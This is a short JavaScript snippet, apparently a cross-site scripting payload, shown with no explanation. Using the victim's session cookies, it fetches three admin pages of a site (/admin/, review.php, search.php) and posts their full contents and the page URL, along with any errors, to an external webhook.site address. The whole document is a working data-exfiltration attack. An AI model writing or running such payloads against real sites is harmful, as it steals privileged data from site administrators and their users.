(async () => {
  const receiver = "https://webhook.site/bbb85c7c-3286-4258-9ca0-8473ede3084e";

  for (const path of ["/admin/", "/admin/review.php", "/admin/search.php"]) {
    try {
      const response = await fetch(path, {
        credentials: "include"
      });

      const body = await response.text();

      await fetch(receiver, {
        method: "POST",
        mode: "no-cors",
        body: JSON.stringify({
          path: path,
          url: location.href,
          body: body
        })
      });
    } catch (error) {
      await fetch(receiver, {
        method: "POST",
        mode: "no-cors",
        body: JSON.stringify({
          error: String(error),
          path: path
        })
      });
    }
  }
})();
